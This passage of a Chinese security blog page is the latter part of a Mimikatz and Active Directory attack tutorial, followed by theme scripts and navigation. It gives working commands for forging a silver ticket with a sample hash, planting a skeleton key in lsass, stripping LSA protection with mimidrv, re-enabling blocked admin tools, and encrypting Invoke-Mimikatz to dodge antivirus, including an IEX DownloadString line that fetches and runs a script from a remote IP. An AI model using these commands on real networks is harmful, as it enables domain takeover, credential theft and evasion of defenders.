+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Copy#在域控上导出 DC$ 的 HASH</span><br><span class="line">mimikatz log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;</span><br><span class="line"></span><br><span class="line">#利用 DC$ 的 Hash制作一张 cifs 服务的白银票据</span><br><span class="line">kerberos::golden /domain:ABC.COM /sid: S-1-5-21-3912242732-2617380311-62526969 /target:DC.ABC.COM /rc4:f3a76b2f3e5af8d2808734b8974acba9 /service:cifs /user:strage /ptt</span><br><span class="line"></span><br><span class="line">#cifs是指的文件共享服务，有了 cifs 服务权限，就可以访问域控制器的文件系统</span><br><span class="line">dir \\DC.ABC.COM\C$</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-3-skeleton-key"><a href="#5-3-skeleton-key" class="headerlink" title="5.3 skeleton key"></a><font style="color:rgb(51, 51, 51);">5.3 skeleton key</font></h4><p><font style="color:rgb(0, 0, 0);">skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效。</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Copy#在域控上安装 skeleton key</span><br><span class="line">mimikatz.exe privilege::debug &quot;misc::skeleton&quot;</span><br><span class="line"></span><br><span class="line">#在域内其他机器尝试使用 skeleton key 去访问域控，添加的密码是 mimikatz</span><br><span class="line">net use \\WIN-9P499QKTLDO.adtest.com\c$ mimikatz /user:adtest\administrator</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(0, 0, 0);">微软在 2014 年 3 月 12 日添加了 LSA 爆护策略，用来防止对进程 lsass.exe 的代码注入。如果直接尝试添加 skelenton key 会失败。</font></p>
+<p><img src="/"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Copy#适用系统</span><br><span class="line">windows 8.1</span><br><span class="line">windows server 2012 及以上</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(0, 0, 0);">当然 mimikatz 依旧可以绕过，该功能需要导入mimidrv.sys文件，导入命令如下:</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Copyprivilege::debug</span><br><span class="line">!+</span><br><span class="line">!processprotect /process:lsass.exe /remove </span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-4-MS14-068"><a href="#5-4-MS14-068" class="headerlink" title="5.4 MS14-068"></a><font style="color:rgb(51, 51, 51);">5.4 MS14-068</font></h4><p><font style="color:rgb(0, 0, 0);">当我们拿到了一个普通域成员的账号后，想继续对该域进行渗透，拿到域控服务器权限。如果域控服务器存在 MS14_068 漏洞，并且未打补丁，那么我们就可以利用 MS14_068 快速获得域控服务器权限。</font></p>
+<p><font style="color:rgb(0, 0, 0);">MS14-068编号 CVE-2014-6324，补丁为 3011780 ，如果自检可在域控制器上使用命令检测。</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copysysteminfo |find &quot;3011780&quot;</span><br><span class="line">#为空说明该服务器存在MS14-068漏洞</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(0, 0, 0);">操作链接：MS14-068复现(CVE-2014-6324)：</font><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11890539.html"><font style="color:rgb(0, 0, 0);">https://www.cnblogs.com/-mo-/p/11890539.html</font></a></p>
+<h3 id="0x06-其他"><a href="#0x06-其他" class="headerlink" title="0x06 其他"></a><font style="color:rgb(0, 0, 0);">0x06 其他</font></h3><h4 id="6-1-使用mimikatz导出chrome中的密码"><a href="#6-1-使用mimikatz导出chrome中的密码" class="headerlink" title="6.1 使用mimikatz导出chrome中的密码"></a><font style="color:rgb(51, 51, 51);">6.1 使用mimikatz导出chrome中的密码</font></h4><p><font style="color:rgb(0, 0, 0);">详情请见：</font><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==&mid=2247483949&idx=1&sn=db4853c88e4bf0a550c095d9017a363c&chksm=e92297aede551eb815a604ba944c4666b260c5bfe044e1b3a60946b586fd5679e29db0adf18d&mpshare=1&scene=23&srcid=&sharer_sharetime=1582350092849&sharer_shareid=d32981e13d51bf06188894426d2a54e5#rd"><font style="color:rgb(0, 0, 0);">链接</font></a></p>
+<h4 id="6-2-隐藏功能"><a href="#6-2-隐藏功能" class="headerlink" title="6.2 隐藏功能"></a><font style="color:rgb(51, 51, 51);">6.2 隐藏功能</font></h4><p><font style="color:rgb(0, 0, 0);">管理员常常会禁用一些重要程序的运行，比如cmd、regedit、taskmgr，此时不方便渗透的进一步进行，这里除了去改回原来的配置，还可以借助mimikatz的一些功能：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Copyprivilege::debug</span><br><span class="line">misc::cmd</span><br><span class="line">misc::regedit</span><br><span class="line">misc::taskmgr</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-3-免杀处理"><a href="#6-3-免杀处理" class="headerlink" title="6.3 免杀处理"></a><font style="color:rgb(51, 51, 51);">6.3 免杀处理</font></h4><p><font style="color:rgb(0, 0, 0);">Powersploit中提供的很多工具都是做过加密处理的，同时也提供了一些用来加密处理的脚本，Out-EncryptedScript就是其中之一。</font></p>
+<p><font style="color:rgb(0, 0, 0);">首先在本地对Invoke-Mimikatz.ps1进行加密处理：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Copypoweshell.exe Import-Module .\Out-EncryptedScript.ps1</span><br><span class="line">poweshell.exe Out-EncryptedScript -ScriptPath .\Invoke-Mimikatz.ps1 -Password 密码 -Salt 随机数</span><br><span class="line">#默认生成的文件是evil.ps1</span><br><span class="line"></span><br><span class="line">-Password   设置加密的密钥</span><br><span class="line">-Salt       随机数，防止被暴力破解</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(0, 0, 0);">将加密生成的evil.sp1脚本放在目标机上，执行如下命令：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Copy#远程加载解密脚本</span><br><span class="line">poweshell.exe </span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://1.1.1.32/PowerSploit/ScriptModification/Out-EncryptedScript.ps1&quot;)</span><br><span class="line"></span><br><span class="line">[String] $cmd = Get-Content .\evil.ps1</span><br><span class="line">Invoke-Expression $cmd</span><br><span class="line">$decrypted = de password salt</span><br><span class="line">Invoke-Expression $decrypted</span><br><span class="line">Invoke-Mimikatz</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763012461670-83245bd4-618a-44fc-a035-5a4574e845e9.png"></p>
+</article>
+<div class="article-footer">
+
+</div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">bug_001</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar 1.33.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-%E7%AE%80%E4%BB%8B"><span class="toc-text">0x00 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E8%8E%B7%E5%8F%96%E6%9C%AC%E5%9C%B0%E5%B8%90%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-text">0x01 获取本地帐户密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-%E6%9C%AC%E5%9C%B0%E6%89%A7%E8%A1%8C"><span class="toc-text">1.1 本地执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-SAM%E8%A1%A8%E8%8E%B7%E5%8F%96hash"><span class="toc-text">1.2 SAM表获取hash</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-Procdump-Mimikatz"><span class="toc-text">0x02 Procdump+Mimikatz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E8%AF%BB%E5%8F%96%E5%9F%9F%E6%8E%A7%E4%B8%AD%E5%9F%9F%E6%88%90%E5%91%98Hash"><span class="toc-text">0x03 读取域控中域成员Hash</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-%E5%9F%9F%E6%8E%A7%E6%9C%AC%E5%9C%B0%E8%AF%BB%E5%8F%96"><span class="toc-text">3.1 域控本地读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-%E5%AF%BC%E5%87%BA%E5%9F%9F%E6%88%90%E5%91%98Hash"><span class="toc-text">3.2 导出域成员Hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-secretsdump%E8%84%9A%E6%9C%AC%E7%9B%B4%E6%8E%A5%E5%AF%BC%E5%87%BA%E5%9F%9Fhash"><span class="toc-text">3.3 secretsdump脚本直接导出域hash</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BBPTH"><span class="toc-text">0x04 哈希传递攻击PTH</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-%E5%B7%A5%E4%BD%9C%E7%BB%84%E7%8E%AF%E5%A2%83"><span class="toc-text">4.1 工作组环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-%E5%9F%9F%E7%8E%AF%E5%A2%83"><span class="toc-text">4.2 域环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-MSF%E8%BF%9B%E8%A1%8C%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92"><span class="toc-text">4.3 MSF进行哈希传递</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB-PTT"><span class="toc-text">0x05 票据传递攻击(PTT)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-text">5.1 黄金票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-2-%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-text">5.2 白银票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-3-skeleton-key"><span class="toc-text">5.3 skeleton key</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-4-MS14-068"><span class="toc-text">5.4 MS14-068</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-%E5%85%B6%E4%BB%96"><span class="toc-text">0x06 其他</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#6-1-%E4%BD%BF%E7%94%A8mimikatz%E5%AF%BC%E5%87%BAchrome%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-text">6.1 使用mimikatz导出chrome中的密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-%E9%9A%90%E8%97%8F%E5%8A%9F%E8%83%BD"><span class="toc-text">6.2 隐藏功能</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-3-%E5%85%8D%E6%9D%80%E5%A4%84%E7%90%86"><span class="toc-text">6.3 免杀处理</span></a></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://img.api.aa1.cn/2025/01/01/a02099351de5a.jpg`,
+    cover: ``,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    // applyThemeToGiscus(theme)
+  }
+
+  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
+  const applyThemeToGiscus = (theme) => {
+    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    }
+    utils.dark.method.toggle.start();
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
